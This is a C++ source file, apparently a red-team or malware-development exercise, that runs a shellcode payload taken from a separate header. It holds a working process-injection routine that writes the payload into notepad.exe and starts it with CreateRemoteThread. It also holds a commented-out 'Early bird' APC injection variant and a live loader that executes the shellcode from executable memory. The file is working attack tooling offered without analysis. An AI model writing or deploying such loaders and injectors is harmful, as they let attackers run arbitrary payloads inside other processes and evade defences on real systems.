// RunShellcode.cpp : This file contains the 'main' function. Program execution begins and ends there.
//
#include <cstring>
#include <cassert>
#include <Windows.h>

#include <TlHelp32.h>
#include <string>

#include "shellcode.h"
#include "stdio.h"

DWORD FindProcessId(std::wstring processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    Process32First(processSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        CloseHandle(processSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            CloseHandle(processSnapshot);
            return processInfo.th32ProcessID;
        }
    }
    CloseHandle(processSnapshot);
    return 0;
}

void inject()
{
    // Open target process:
    DWORD Processld = FindProcessId(L"notepad.exe");
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, false, Processld);

    int size = sizeof(shellcode) / sizeof(shellcode[0]);

    // Allocate memory for the dll in target process: 
    LPVOID Executablelmage = VirtualAllocEx(hProcess, 0, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    // copy headers to target process:
    WriteProcessMemory(hProcess, Executablelmage, shellcode, size, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Executablelmage, NULL, 0, NULL);

    // Wait for the loader to finish executing
    WaitForSingleObject(hThread, INFINITE);

    // free the allocated loader code
    VirtualFreeEx(hProcess, Executablelmage, 0, MEM_RELEASE);

    return;
}

void main() {

    //inject();

    /*
    //Early bird 
    typedef NTSTATUS(NTAPI* myNtTestAlert)(void);
    //using myNtTestAlert = NTSTATUS(NTAPI*)();

    myNtTestAlert testAlert = (myNtTestAlert)(GetProcAddress(GetModuleHandleA("ntdll"), "NtTestAlert"));
    SIZE_T shellSize = sizeof(shellcode) / sizeof(shellcode[0]);
    LPVOID shellAddress = VirtualAlloc(NULL, shellSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(GetCurrentProcess(), shellAddress, shellcode, shellSize, NULL);

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;
    QueueUserAPC((PAPCFUNC)apcRoutine, GetCurrentThread(), NULL);
    testAlert();
    */

    int size = sizeof(shellcode) / sizeof(shellcode[0]);
    LPVOID ptr = (LPVOID)VirtualAlloc(0, size, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    
    memcpy(ptr, shellcode, size);

    ((void(*)())ptr)();

    printf("Shell code returned gracefully\n");
}